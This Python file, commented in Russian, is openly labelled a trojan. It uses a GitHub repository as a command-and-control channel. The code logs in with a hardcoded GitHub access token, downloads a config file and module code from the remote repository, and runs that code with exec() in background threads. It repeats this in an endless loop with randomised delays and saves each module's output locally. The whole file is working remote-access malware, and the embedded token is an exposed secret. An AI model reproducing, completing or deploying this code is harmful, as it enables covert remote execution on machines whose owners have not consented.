import json
import os
import sys
import time
import types
import random
import threading
import queue
import base64
from github3 import login

# Настройки
trojan_id = "test_trojan"
trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}/"
configured = False
task_queue = queue.Queue()

# Параметры GitHub
GITHUB_TOKEN = "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"
REPO_OWNER = "An0nimus85"
REPO_NAME = "test_trojan"

def connect_to_github():
    if not GITHUB_TOKEN:
        raise ValueError("Не установлен токен GitHub. Установите переменную окружения GITHUB_TOKEN.")
    print(f"[*] Подключение к GitHub с использованием токена, владельца репозитория {REPO_OWNER} и имени репозитория {REPO_NAME}")
    gh = login(token=GITHUB_TOKEN)
    repo = gh.repository(REPO_OWNER, REPO_NAME)
    branch = repo.branch("master")  # Обновите имя ветки на то, которое используется в вашем репозитории
    return gh, repo, branch

def get_file_contents(filepath):
    try:
        gh, repo, branch = connect_to_github()
        tree = branch.commit.commit.tree.to_tree().recurse()
        for filename in tree.tree:
            if filepath in filename.path:
                print(f"[*] Найден файл {filepath}")
                blob = repo.blob(filename._json_data['sha'])
                content = base64.b64decode(blob.content).decode('utf-8')
                print(f"[*] Содержимое файла {filepath}: {content}")
                return content
        print(f"[*] Файл {filepath} не найден в репозитории")
    except Exception as e:
        print(f"[*] Ошибка при получении содержимого файла {filepath}: {e}")
    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(f"config/{trojan_id}.json")
    if config_json:
        try:
            configuration = json.loads(config_json)
            configured = True
            print("[*] Конфигурация загружена")
            for tasks in configuration:
                module_name = tasks['module']
                module_path = f"modules/{module_name}.py"
                print(f"[*] Проверка наличия файла {module_path}")
                # Попытка загрузить модуль из GitHub
                module_code = get_file_contents(module_path)
                if module_code:
                    print(f"[*] Загружаем модуль {module_name} из GitHub")
                    # Создание модуля и выполнение кода в нем
                    module = types.ModuleType(module_name)
                    exec(module_code, module.__dict__)
                    sys.modules[module_name] = module
                    print(f"[*] Модуль {module_name} успешно загружен в sys.modules")
                else:
                    print(f"[*] Модуль {module_name} не найден в GitHub")
            return configuration
        except json.JSONDecodeError as e:
            print(f"[*] Ошибка декодирования конфигурационного файла: {e}")
    else:
        print("[*] Конфигурационный файл не загружен")
    return []

def store_module_result(data):
    if not os.path.exists(data_path):
        os.makedirs(data_path)
    file_path = f"{data_path}{random.randint(1000, 100000)}.data"
    with open(file_path, 'w') as file:
        file.write(data)
    print(f"[*] Данные сохранены в {file_path}")

def module_runner(module):
    task_queue.put(1)
    if module in sys.modules:
        try:
            print(f"[*] Запуск модуля {module}")
            result = sys.modules[module].run()
            print(f"[*] Результат выполнения модуля {module}: {result}")
            task_queue.get()
            store_module_result(result)
        except AttributeError as e:
            print(f"[*] Ошибка при выполнении модуля {module}: {e}")
        except Exception as e:
            print(f"[*] Общая ошибка при выполнении модуля {module}: {e}")
    else:
        print(f"[*] Модуль {module} не найден в sys.modules")
    return

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(5, 20))
